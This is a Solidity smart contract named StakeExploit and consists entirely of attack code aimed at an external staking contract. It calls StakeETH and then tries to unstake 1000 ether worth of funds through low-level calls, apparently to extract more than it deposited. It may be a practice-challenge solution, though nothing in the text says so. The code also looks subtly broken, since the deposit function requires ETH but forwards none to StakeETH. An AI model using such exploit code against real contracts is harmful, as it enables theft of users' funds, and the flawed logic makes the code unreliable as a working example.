pragma solidity ^0.8.0;

interface IStake {
    function StakeETH() external payable;
    function Unstake(uint256 amount) external returns (bool);
}


contract StakeExploit {
    address immutable stake;

    constructor(address _stake) {
        stake = _stake;
    }

    function depositAndStakeETH() external payable {
        require(msg.value > 0.001 ether, "Need 0.001 ETH");
        (bool success,) = payable(stake).call(abi.encodeWithSelector(IStake.StakeETH.selector));
        require(success, "StakeETH failed");
    }

    function unstakeFunds() public {
        (bool success,) = stake.call(abi.encodeWithSelector(IStake.Unstake.selector, 1000 * 1e18));
        require(success, "Unstake failed");
    }

    // Allow Ethers to be sent to this contract
    receive() external payable {}
}